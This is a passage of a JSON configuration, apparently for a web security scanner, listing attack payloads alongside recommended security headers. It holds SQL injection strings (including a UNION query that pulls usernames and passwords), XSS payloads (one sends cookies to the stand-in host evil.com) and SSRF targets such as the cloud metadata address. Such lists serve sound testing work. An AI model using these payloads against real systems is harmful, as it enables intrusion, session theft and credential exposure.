  "payloads": {
    "sql_injection": {
      "error_based": ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--"],
      "blind": ["' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--"],
      "union": ["' UNION SELECT username,password FROM users--"]
    },
    "xss": {
      "reflected": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
      "stored": ["<script>document.location='http://evil.com/?c='+document.cookie</script>"],
      "dom_based": ["<svg onload=alert(1)>"]
    },
    "ssrf": {
      "localhost": ["http://127.0.0.1", "http://localhost", "http://[::1]"],
      "cloud_metadata": ["http://169.254.169.254/latest/meta-data/"]
    }
  },
  "security_headers": {
    "X-Frame-Options": {"values": ["DENY", "SAMEORIGIN"], "purpose": "Prevent clickjacking"},
    "Content-Security-Policy": {"purpose": "Prevent XSS and injection"},
    "Strict-Transport-Security": {"purpose": "Force HTTPS"},
    "X-Content-Type-Options": {"value": "nosniff", "purpose": "Prevent MIME sniffing"},
    "X-XSS-Protection": {"value": "1; mode=block", "purpose": "Enable XSS filter"},
    "Referrer-Policy": {"values": ["no-referrer", "strict-origin-when-cross-origin"]},
    "Permissions-Policy": {"purpose": "Control browser features"}
  },
  "cwe_mappings": {
